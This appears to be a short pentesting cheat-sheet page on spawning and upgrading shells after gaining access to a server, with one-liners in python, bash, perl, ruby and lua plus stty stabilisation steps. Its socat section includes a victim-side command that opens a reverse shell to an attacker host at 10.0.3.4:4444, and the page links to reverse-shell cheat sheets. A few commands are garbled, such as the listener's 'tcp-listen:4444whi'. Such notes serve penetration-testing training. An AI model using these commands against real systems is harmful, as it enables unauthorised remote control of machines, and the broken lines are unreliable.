---
title: Spawn a shell
author: amandaguglieri
draft: false
TableOfContents: true
tag: pentesting, terminal, shells
---

# Spawn a shell

Webshell is a script written in a language that is executed by a server. Web shell are not fully interactive. 

??? note "Resources for upgrading simple shells"
    - [https://sushant747.gitbooks.io/total-oscp-guide/content/spawning_shells.html](https://sushant747.gitbooks.io/total-oscp-guide/content/spawning_shells.html).
    - [Cheat sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).
    - [Shell creation](https://rosettacode.org/wiki/Execute_a_system_command).
    - [About webshells](https://github.com/BlackArch/webshells).


Sidenote: Also, you can generate a webshell by using  msfvenom


## python

```bash
python -c 'import os; os.system("/bin/sh")'
```

```bash
 # using python for a pseudo terminal
python -c 'import pty; pty.spawn("/bin/bash")'
```


## bash

```bash
bash -i

# Using echo
echo 'os.system('/bin/bash')'
```


## ssh

```bash
/bin/sh -i
```


## perl

```bash
perl -e 'exec "/bin/sh";'

perl:  exec "/bin/sh";
```


## ruby

```bash
ruby:  exec "/bin/sh";
```


## lua

```bash
lua: os.execute(‘/bin/sh’)
```
  

## socat

```bash
# Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444whi

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
  

## stty options

```bash
# In reverse shell
$ python -c 'import pty; pty.spawn("/bin/bash")'

# Ctrl-Z
 

# In Kali
$ stty raw -echo
$ fg
```
  
```bash
# In reverse shell
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows <num> columns <cols>
```
